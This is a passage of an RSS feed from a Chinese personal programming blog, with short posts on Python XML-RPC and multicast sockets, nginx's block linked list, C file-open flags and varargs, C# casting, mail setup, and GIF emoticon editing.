<![CDATA[首先来一个服务端和一个客户端<br>服务端<br>imp<wbr>ort SimpleXMLRPCServer<br>class MyObject:<br>&nbsp;&nbsp;&nbsp; def sayHello(self):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return "hello worlp"<br>obj = MyObject()<br>server = SimpleXMLRPCServer.SimpleXMLRPCServer(("192.201.0.111", 8000))<br>server.register_instance(obj)<br>print "Listening on port 8000"<br>server.serve_forever()<br>客户端<br>imp<wbr>ort xmlrpclib<br>server = xmlrpclib.ServerProxy("http://192.201.0.111:8000")<br>words = server.sayHello()<br>print "result:" + words<br>然后启动WireShark，再运行客户端<br>抓包分析为HTTP请求与回复<br>用telnet模拟如下：<br>hankjin@jnfdaj:~/src$ telnet 192.201.0.111 8000<br>Trying 192.201.0.111...<br>Connected to 192.201.0.111.<br>Escape character is '^]'.<br>POST /RPC2 HTTP/1.0<br>Content-Type: text/xml<br>Content-Length: 85<br>&lt;?xml version='1.0'?&gt;<br>&lt;methodCall&gt;<br>&lt;methodName&gt;sayHello&lt;/methodName&gt;<br>&lt;params&gt;<br>&lt;/params&gt;<br>&lt;/methodCall&gt;<br>HTTP/1.0 200 OK<br>Server: BaseHTTP/0.3 Python/2.5.2<br>Date: Wed, 28 Apr 2010 08:38:51 GMT<br>Content-type: text/xml<br>Content-length: 138<br><br>&lt;?xml version='1.0'?&gt;<br>&lt;methodResponse&gt;<br>&lt;params&gt;<br>&lt;param&gt;<br>&lt;value&gt;&lt;string&gt;hello xmlprc&lt;/string&gt;&lt;/value&gt;<br>&lt;/param&gt;<br>&lt;/params&gt;<br>&lt;/methodResponse&gt;<br>Connection closed by foreign host.<br>真相大白<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201032844740100/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的数据结构(2) 链表ngx_list_s]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201091111303630/</link>
      <description>
<![CDATA[nginx 的链表的定义在core/ngx_list.h中：<br>typedef struct {<br>&nbsp;&nbsp;&nbsp; ngx_list_part_t&nbsp; *last;&nbsp;&nbsp;&nbsp;&nbsp; //最后一块<br>&nbsp;&nbsp;&nbsp; ngx_list_part_t&nbsp;&nbsp; part;&nbsp;&nbsp;&nbsp;&nbsp; //第一块<br>&nbsp;&nbsp;&nbsp; size_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //元素大小<br>&nbsp;&nbsp;&nbsp; ngx_uint_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nalloc;&nbsp;&nbsp; //每块可存的元素个数<br>&nbsp;&nbsp;&nbsp; ngx_pool_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *pool;&nbsp;&nbsp; //内存池<br>} ngx_list_t;<br><br>nginx 的链表和传统的链表不同，不是将<b>每个</b>元素通过指针连接起来，而是将<b>每块</b>元素通过指针连接起来。<br>链表块的定义如下：<br>struct ngx_list_part_s {<br>&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *elts;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //元素所在内存<br>&nbsp;&nbsp;&nbsp; ngx_uint_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nelts;&nbsp;&nbsp;&nbsp;&nbsp; //已经存储的元素个数<br>&nbsp;&nbsp;&nbsp; ngx_list_part_t&nbsp; *next;&nbsp;&nbsp;&nbsp; //下一块<br>};<br><div><img title="nginx的数据结构(2) 链表ngx_list_s - hankjin - 云水居" alt="nginx的数据结构(2) 链表ngx_list_s - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img762.ph.126.net/W4Je8W9P-g8CKaYDwosBhg==/4947485665643323940.png"></div>上图的ngx_list包含四个块，共 3*n+m 个元素。注意，只有最后一个块才可能处于不満状态，因为和 ngx_array 一样，ngx_list 也没有定义元素删除操作。甚至ngx_list连整个链表销毁的操作也没定义。<br>&nbsp;<br>链表结构内包含第一个块，以及最后一个块的指针。<br><b>1。创建链表：</b><br>创建链表主要是申请两块内存，初始化一些变量：<br>申请ngx_list_t，因为ngx_list_t中包括一个ngx_list_part，所以申请ngx_list_t的同时也申请到了一个ngx_list_part<br>申请ngx_list_part的元素数组的内存<br>代码如core/ngx_list.c的ngx_list_create所示<br>&nbsp;&nbsp;&nbsp; list = ngx_palloc(pool, sizeof(ngx_list_t));//申请ngx_list_t内存<br>&nbsp;&nbsp;&nbsp; list-&gt;part.elts = ngx_palloc(pool, n * size);//申请元素数组的内存(元素个数＊每个元素的大小)<br>&nbsp;&nbsp;&nbsp; list-&gt;part.nelts = 0;//已存0个元素<br>&nbsp;&nbsp;&nbsp; list-&gt;part.next = NULL;//只有一个块<br>&nbsp;&nbsp;&nbsp; list-&gt;last = &amp;list-&gt;part;//最后一个块即为当前块<br>&nbsp;&nbsp;&nbsp; list-&gt;nalloc = n;//可存的元素个数<br><br><b>2。加入元素：<br></b>加入元素时，首先根据ngx_list_t的last指针定位最后一块，<br>然后检测最后一块的元素是否已经用完了，ngx_list_part_t-&gt;nelts == ngx_list_t-&gt;nalloc<br>如果没満，则将最后一块的第nelts元素返回即可。<br>代码如core/ngx_list.c的ngx_list_push所示：<br>&nbsp;&nbsp;&nbsp; elt = (char *) last-&gt;elts + l-&gt;size * last-&gt;nelts; //空闲元素位置<br>&nbsp;&nbsp;&nbsp; last-&gt;nelts++; //已存储的元素个数+1<br>如果满了，则申请一个新的链表块，并加入链<br>if (last-&gt;nelts == l-&gt;nalloc) {//如果最后一个块的元素已经用完了<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last = ngx_palloc(l-&gt;pool, sizeof(ngx_list_part_t)); //申请一个块结构<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last-&gt;elts = ngx_palloc(l-&gt;pool, l-&gt;nalloc * l-&gt;size);//申请新块的元素数组<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last-&gt;nelts = 0;//初始化新块<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last-&gt;next = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l-&gt;last-&gt;next = last;//将新块加入链表<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l-&gt;last = last;//修改链表的last指针，让其指向新申请的块<br>然后再定位并返回元素。<br><br><b>3。遍历链表：<br></b>nginx 链表的与众不同导致其遍历方式也与一般链表不同。<br>要遍历每个块的每个元素，需要维护两个指针和一个下标：当前块指针,当前元素指针和当前元素下标<br>常见的nginx链表访问方式如下所示：<br>//core/ngx_cycle.c中的ngx_init_cycle函数中对file的操作部分<br>&nbsp;&nbsp;&nbsp; part = mylist-&gt;part;//块指针初始化为第一块<br>&nbsp;&nbsp;&nbsp; ele = part-&gt;elts; //元素指针初始化为元素指针<br>&nbsp;&nbsp;&nbsp; for (i = 0; /* void */ ; i++) { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i &gt;= part-&gt;nelts) {//当前块遍历完成<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (part-&gt;next == NULL) {//如果没有其它块，则退出循环<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; part = part-&gt;next;//当前块指向下一块<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ele = part-&gt;elts; //修改当前块的元素指针<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i = 0; //修改元素指针的下标<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br><b>优点</b>：<br>ngx_list 采用分块的方式进行内存管理，确实在很大程度上降低了从内存池申请内存的频率，对性能提升有较好的帮助。<br>但分块的特点也决定了元素删除操作较难处理，而ngx_list没有定义删除操作，难道是因为这个原因？<br>nginx 定义了还定义了队列 ngx_queue 的数据结构, 与 ngx_list 相比，ngx_queue 更像链表。可以说 ngx_list 是一种比较特殊的链表：块链表。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201091111303630/</guid>
    </item>
    <item>
      <title>
<![CDATA[在线词典API]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720106168494882/</link>
      <description>
<![CDATA[http://dict-co.iciba.com/api/dictionary.php?w=joke<br><br>&lt;dict num="219" id="219" name="219"&gt;&lt;key&gt;joke&lt;/key&gt;&lt;ps&gt;d??uk&lt;/ps&gt;&lt;pron&gt;&lt;/pron&gt;&lt;pos&gt;n.&lt;/pos&gt;&lt;acceptation&gt;笑话, 玩笑&lt;/acceptation&gt;&lt;pos&gt;v.&lt;/pos&gt;&lt;acceptation&gt;(和...)开玩笑&lt;/acceptation&gt;&lt;sent&gt;&lt;/sent&gt;&lt;sent&gt;&lt;/sent&gt;&lt;sent&gt;&lt;/sent&gt;&lt;sent&gt;&lt;/sent&gt;&lt;sent&gt;&lt;orig&gt;The joke miscarried.&lt;/orig&gt;&lt;pron&gt;http://res.iciba.com/resource/phrase_mp3/5/7/57804b4758bb718a6f297e5cc85ab196.mp3&lt;/pron&gt;&lt;trans&gt;那个笑话不好笑。&lt;/trans&gt;&lt;/sent&gt;&lt;/dict&gt;]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720106168494882/</guid>
    </item>
    <item>
      <title>
<![CDATA[open与fopen的flag/mode参数]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010412343105/</link>
      <description>
<![CDATA[fopen是标准C++支持的函数，原型如下：<br>FILE *fopen(const char *path, const char *mode);<br>mode的选项有r, w, a, r+, w+, a+，区别如下：<br>r: 只读<br>w: 只写<br>a: 附加<br>r+: 读+写<br>w+: 读+写，如果文件已经存在则清空<br>a+: 附加+读<br>因此，<br>只读r，只写w，添加a，写+读w+，加+读a+<br>r+在文件不存在时出错，而w+不会<br><br>open是unix系统函数，在unistd.h中，原型如下：<br>int open(const char *pathname, int flags);<br>int open(const char *pathname, int flags, mode_t mode);<br>flags必须包括以下三项之一：O_RDNLY, O_WRONLY, O_RDRW, 分别为只读、只写、读写<br>flags其它项为：O_APPEND, O_ASYNC, O_CREAT, O_DIRECT, ...<br>mode用于创建文件时指定访问控制，只有在flag中包含O_CREAT时生效，包括<br>S_IRWXU, S_IRUSR, S_IWUSR, S_IXUSR...<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010412343105/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下配置发送邮件服务]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720101235520146/</link>
      <description>
<![CDATA[sudo apt-get install mailx<div>sudo dpkg-reconfigure exim4-config</div><div>选择internet选项</div><div>mail hankjin@163.com</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720101235520146/</guid>
    </item>
    <item>
      <title>
<![CDATA[python中使用socket作组播]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201082091835607/</link>
      <description>
<![CDATA[组播的socket套接字选项是IPPROTO_IP(level)，IP_ADD_MEMBERSHIP(option)，ip_mreq(value)<br>从/usr/include/linux/in.h中查到ip_mreq的结构为<br>struct ip_mreq<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct in_addr imr_multiaddr;&nbsp;&nbsp; /* IP multicast address of group */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct in_addr imr_interface;&nbsp;&nbsp; /* local IP address of interface */<br>};<br>而在python中没有对应的类型，所以要用struct来构造一个<br>首先将struct import进来，然后使用struct.pack将两个地址进行打包，返回值即可作为setsockopt的值参数<br>mreq=struct.pack("4sl",inet_aton("224.0.0.123"),INADDR_ANY)<br>s.setsockopt(IPPROTO_IP,IP_ADD_MEMBERSHIP,mreq)<br>然后要将设置这个选项，告诉服务器要往Internet上组播，&lt;32的值表示在局域网内，&gt;32表示往互联网上发<br>sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)<br>遗憾的是，组播还需要路由设备的支持，实际支持情况并不乐观。<br><br>全部代码如下：<br>服务器<br>&gt;&gt;&gt; from socket import *<br>&gt;&gt;&gt; import struct<br>&gt;&gt;&gt; s=socket(AF_INET,SOCK_DGRAM)<br>&gt;&gt;&gt; s.bind(('',4242))<br>&gt;&gt;&gt; mreq=struct.pack("=4sl",inet_aton("224.0.0.123"),INADDR_ANY)<br>&gt;&gt;&gt; s.setsockopt(IPPROTO_IP,IP_ADD_MEMBERSHIP,mreq)<br>&gt;&gt;&gt; s.sendto("robot",("224.0.0.123",4242))<br>5<br>&gt;&gt;&gt; s.recv(1024)<br>'robot'<br>&gt;&gt;&gt; s.recv(1024)<br>客户端<br>&gt;&gt;&gt; from socket import *<br>&gt;&gt;&gt; import struct<br>&gt;&gt;&gt; s=socket(AF_INET,SOCK_DGRAM)<br>&gt;&gt;&gt; s.bind(('',4242))<br>&gt;&gt;&gt; mreq=struct.pack("=4sl",inet_aton("224.0.0.123"),INADDR_ANY)<br>&gt;&gt;&gt; s.setsockopt(IPPROTO_IP,IP_ADD_MEMBERSHIP,mreq)<br>&gt;&gt;&gt; s.sendto("robot",("224.0.0.123",4242))<br>5<br>&gt;&gt;&gt; s.recv(1024)<br>'robot'<br>&gt;&gt;&gt; s.sendto("robot",("224.51.105.104",4242))<br>5<br>&gt;&gt;&gt; s.sendto("robot",("224.51.105.104",4242))<br>5]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201082091835607/</guid>
    </item>
    <item>
      <title>
<![CDATA[动画制作与修改软件Jasc Animation Shop]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201093094410198/</link>
      <description>
<![CDATA[<P>QQ有一个流汗的表情：<IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg">，经常用，而且喜欢几个一起用。</P>
<P>用得久了，就发现一个问题，比如连发七个，会发现他们流汗的节奏是一致的：</P>
<P><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.jpg"></P>
<P>总觉得这样不好玩儿，有没有办法让这七个表情的流汗节奏呈现一定地规律呢？每一个都比前一个慢半拍，这样就呈现一个类似波浪的效果，肯定会比原来的齐刷刷的效果要好。</P>
<P>gif的原理就是多幅图片的叠加，因此只要修改这个流汗表情的图片出现顺序，就可以实现这个效果，上网找一个gif修改软件 Jasc Animation Shop。</P>
<P>先将QQ的流汗表情保存为gif文件</P>
<P>再用Jasc Animation Shop打开这个gif文件：</P>
<DIV><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img242.ph.126.net/eKoEVEBZ6ebZbfwd0_AS_w==/1427078131924460656.jpg"></DIV>
<DIV>可以看到，一共七帧，先将第一帧用鼠标拖到第七帧的后面，另存为第二张。</DIV>
<DIV>然后再对第二张进行一样的操作，另存为第三张</DIV>
<DIV>。。。</DIV>
<DIV>产生七张表情后，再将这七张图片添加到表情，最后为这七张表情设置快捷键：1 2 3 4 5 6 7</DIV>
<DIV>以后要发送的时候，只要输入1234567，这七个表情就出来了，发给对方后，以波浪流汗的形式显示：</DIV>
<DIV>
<DIV><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img169.ph.126.net/PjpI0JVyQDycBC5Z4mEFSQ==/1453536779735680148.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img850.ph.126.net/D-uQGwc7KctxXLtwEXGVfg==/582371726815669157.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img74.ph.126.net/g6cS-wtyGHYMf6s13CiwyQ==/847239679900654814.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img74.ph.126.net/priW-HuqZzUK1WzM1ubPFg==/847239679900654854.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img153.ph.126.net/YkEfhy9Pmgb4DpjH62m9jg==/3038522373593340695.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img74.ph.126.net/iglIouo-Bn8lFtKGghLwtQ==/847239679900654864.gif"><IMG title="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" alt="动画制作与修改软件Jasc Animation Shop - hankjin - 云水居" style="MARGIN: 0px 10px 0px 0px;" src="http://img.ph.126.net/t0j80e2Dt5wmTnIwanPCYA==/3699425618908345852.gif"></DIV>
<DIV>&nbsp;</DIV>&nbsp;</DIV>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp; </P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201093094410198/</guid>
    </item>
    <item>
      <title>
<![CDATA[python读取命令行输入和密码同时重定向到文件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372014321112517804/</link>
      <description>
<![CDATA[在脚本中，需要执行命令并重定向输入到文件或管道中，然后从中grep信息，但是有时命令中包含raw_input或getpass.getpass需要输入帐户和密码，如果重定向，则看不到输入信息的提示。<wbr><div>要支持命令行输入信息，同时重定向到文件，有两个思路：重定向stdout或重定义raw_input</div><div>1. 重定义stdout</div><div>用法：<span style="line-height: 28px;"   >wrap.py log bin.py arg1 arg2</span></div><div>方法：重定义stdout，将std输入变更控制台与文件，相当实现了tee功能</div><div>问题：如果代码中出现了reload(sys)，则本方法失效。例如 print('hi'); reload(sys); print('hi')，则reload后的输出无法输出到文件中。</div><div><div>import sys</div><div><br></div><div>class __redirection__:</div><div>&nbsp; &nbsp; def __init__(self, fname):</div><div>&nbsp; &nbsp; &nbsp; &nbsp; self.__console__=sys.stdout</div><div>&nbsp; &nbsp; &nbsp; &nbsp; self.fp=open(fname, 'w')</div><div>&nbsp; &nbsp; def write(self, output_stream):</div><div>&nbsp; &nbsp; &nbsp; &nbsp; self.__console__.write(output_stream)</div><div>&nbsp; &nbsp; &nbsp; &nbsp; self.fp.write(output_stream)</div><div><br></div><div>def main():</div><div>&nbsp; &nbsp; if len(sys.argv) &lt; 2:</div><div>&nbsp; &nbsp; &nbsp; &nbsp; sys.stderr.write('Usage %s &lt;tmp_file&gt; [&lt;args&gt;]' % sys.argv[0])</div><div>&nbsp; &nbsp; print 'redirect to %s' % sys.argv[1]</div><div>&nbsp; &nbsp; r_obj=__redirection__(sys.argv[1])</div><div>&nbsp; &nbsp; sys.stdout=r_obj</div><div>&nbsp; &nbsp; sys.stderr=r_obj</div><div>&nbsp; &nbsp; print sys.argv</div><div>&nbsp; &nbsp; sys.argv=sys.argv[2:]</div><div>&nbsp; &nbsp; l = {'__name__': '__main__','__file__': '/home/work/bin/upload.py'}</div><div>&nbsp; &nbsp; execfile('/home/work/bin/upload.py', l, l)</div><div><br></div><div>if __name__=='__main__':</div><div>&nbsp; &nbsp; main()</div></div><div><br></div><div>2. 重定义raw_input和getpass.getpass</div><div><span style="line-height: 28px;"   >用法：</span><span style="line-height: 28px;"   >wrap.py bin.py arg1 arg2 | tee log</span></div><div>方法：重写raw_input和getpass.getpass</div><div>问题：同一，如果出现reload(getpass)则失效，但基本不可能</div><div><div>import sys</div><div>import getpass</div><div><br></div><div>old_raw_input=raw_input</div><div>def my_raw_input(tip):</div><div>&nbsp; &nbsp; sys.stdout.write(tip)</div><div>&nbsp; &nbsp; sys.stdout.flush()</div><div>&nbsp; &nbsp; return old_raw_input()</div><div>old_getpass=getpass.getpass</div><div>def my_getpass(tip):</div><div>&nbsp; &nbsp; sys.stdout.write(tip)</div><div>&nbsp; &nbsp; sys.stdout.flush()</div><div>&nbsp; &nbsp; return old_getpass()</div><div><br></div><div>def main():</div><div>&nbsp; &nbsp; if len(sys.argv) &lt; 1:</div><div>&nbsp; &nbsp; &nbsp; &nbsp; sys.stderr.write('Usage %s &lt;bin&gt; [&lt;args&gt;]' % sys.argv[0])</div><div>&nbsp; &nbsp; raw_input=my_raw_input</div><div>&nbsp; &nbsp; getpass.getpass=my_getpass</div><div>&nbsp; &nbsp; g=globals()</div><div>&nbsp; &nbsp; g['__file__']='${BIN_PATH}'</div><div>&nbsp; &nbsp; l=locals()</div><div>&nbsp; &nbsp; sys.argv=sys.argv[1:]</div><div>&nbsp; &nbsp; print sys.argv</div><div>&nbsp; &nbsp; execfile('${BIN_PATH}', g, l)</div><div><br></div><div>if __name__=='__main__':</div><div>&nbsp; &nbsp; main()</div></div><div>#wrap.py bin arg1 arg2 | tee log</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372014321112517804/</guid>
    </item>
    <item>
      <title>
<![CDATA[[译]C#类型转换]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200992995414295/</link>
      <description>
<![CDATA[<ol><li>
<p>C#是一门强类型的语言，当类型不匹配时必须转换类型.</p>
<p>C#的一般转型语法和C++、Java一样：</p><pre style="margin-top: 0pt;" lang="cs"><span>string</span> s = (<span>string</span>)obj;<br></pre>
<p>转型操作符对右面的整个表达式有效，在下面的例子中，a.b被转型成Form，而不是a.</p><pre style="margin-top: 0pt;" lang="cs">Form f = (Form)a.b;<br></pre>
<p>如果要对表达式的一部分转型，请使用括号，在下面的例子中，obj被转型成Form:</p><pre style="margin-top: 0pt;" lang="cs"><span>string</span> s = ((Form)obj).Text;</pre>
</li><li>
<p>C#还有一个转型操作符 <co>de lang="cs"&gt;<span>as</span></co>de&gt;.</p>
<p>as操作符和转型基本一样，但是转型失败时，它返回null，而一般转型则会抛出异常。在下面的例子中，btn的最终值是null:</p><pre style="margin-top: 0pt;" lang="cs"><span>Object</span> obj = <span>new</span> TextBox();<br>Button btn = obj <span>as</span> Button;<br></pre>
</li><li>
<p>判断一个对象是否是指定的类型，可以用is操作符。</p><pre style="margin-top: 0pt;" lang="cs"><span>if</span> (obj <span>is</span> TextBox) {...}<br></pre>
</li><li>
<p>对于一个给定的类型，可以用typeof操作符获取它的<co>de&gt;System.Type<span style="font-family: Arial,Verdana,Helvetica,Sans-Serif;">对象</span></co>de&gt;。</p><pre style="margin-top: 0pt;" lang="cs">System.Type t;<br>t = <span>typeof</span>(<span>String</span>);<br>MessageBox.Show(t.FullName);<br></pre>
</li><li>
<p>对于一个给定的对象，可以用GetType方法获取它的System.Type对象。</p><pre style="margin-top: 0pt;" lang="cs">System.Type t;<br>t = obj.GetType();<br>MessageBox.Show(t.FullName);</pre></li><li>看懂下面这无句话，上面的就不用看了<br>string a = (string)b;<br>string a = b as string;<br>if(b is string)<br>Type t = b.GetType()<br>Type t = typeof(string);<br></li></ol>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200992995414295/</guid>
    </item>
    <item>
      <title>
<![CDATA[C语言函数的可变长度参数va_arg剖析]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092185836599/</link>
      <description>
<![CDATA[C语言的printf函数，可以输入不同的参数，一般通过函数重载的方式实现这种函数名相同而参数不同的机制，但考虑到printf的所有可能性，函数重载很明显解决不了这个问题，printf 和vsprintf 使用了可变长度参数来实现这种机制。<br>先看一个典型作用<br>void f(int flag, ...){<br>&nbsp;&nbsp;&nbsp; va_list args;<br>&nbsp;&nbsp;&nbsp; va_start(args, flag);<br>&nbsp;&nbsp;&nbsp; int n = va_arg(args, int);<br>}<br><b>C语言的函数调用机制</b><br>C语言的函数调用机制，是将函数参数与函数调用后下一条指令的地址都压入栈中，然后跳到函数的入口地址。<br><div><img title="C语言函数的可变长度参数va_arg剖析 - hankjin - 云水居" alt="C语言函数的可变长度参数va_arg剖析 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/2ltN4gWw1EmAxQZduZt_xw==/3238651082034421149.png"></div>例如<br>void func(int param1, double param2,int param3){ }<br>int main(){ <br>&nbsp; func(3, 1.2, 4); <br>&nbsp; printf("Over\n"); //设指令地址为0x1234<br>&nbsp; return 0;<br>}<br>执行f(3, 1.2, 4)的函数调用，进入func函数时的堆栈如下：<br><div><img title="C语言函数的可变长度参数va_arg剖析 - hankjin - 云水居" alt="C语言函数的可变长度参数va_arg剖析 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/Ue3i3FwGcSu3SHdc127dJw==/3700832993792199720.png"></div>&nbsp;这样，通过param1的地址就可以计算出param2与param3的地址：<br>&amp;param2 = ((char*)&amp;param1) + sizeof(param2)<br>所以...只是对后面的参数的一种省略的写法，只要我们在程序中进行相应的计算与类型转换，就可以得到每个参数的值。<br><b>模拟实现<br></b>//方法一<br>void func(int param1, double param2, int param3){<br>&nbsp; double *p2 = (double*)&nbsp; ((char*) param1) + sizeof(param1);<br>&nbsp; int *p3 = (int*) ((char*)param1)+sizeof(param1)+sizeof(param2);<br>}<br>//方法二<br>void func(int param1, double param2, int param3){<br>&nbsp; char * p;<br>&nbsp; p = (char*)&amp;param1 + sizeof(param1);//参数一的结尾<br>
